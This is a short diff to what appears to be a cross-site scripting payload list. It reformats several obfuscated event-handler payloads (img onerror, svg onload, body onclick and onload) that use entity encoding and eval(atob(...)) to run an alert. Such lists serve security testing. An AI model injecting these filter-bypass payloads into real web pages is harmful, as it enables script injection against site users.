@@ -35,4 +35,7 @@
 <body onload="((a)=>{&lt;!--&gt;&#10onload=()=>{a=1;alert(a)}})();">
 <body onload="((a)=>{&lt;!--&gt;&#10onload=(()=>{a=1;alert(a)})()})();">
 <style onload="((a)=>{&lt;!--&#09;&gt;&#10;a=1;alert&#10;&lpar;a&rpar;})();">
-<img onerror=eval(atob('YWxlcnQoMSk=')); src=a;><body onclick=eval(atob('YWxlcnQoMSk='));><img onerror=eval(atob('YWxlcnQoMSk='));><svg onload=eval(atob('YWxlcnQoMSk='));>
+<img onerror=eval(atob('YWxlcnQoMSk=')); 
+src=a;><body onclick=eval(atob('YWxlcnQoMSk='));>
+<img onerror=eval(atob('YWxlcnQoMSk='));>
+<svg onload=eval(atob('YWxlcnQoMSk='));>
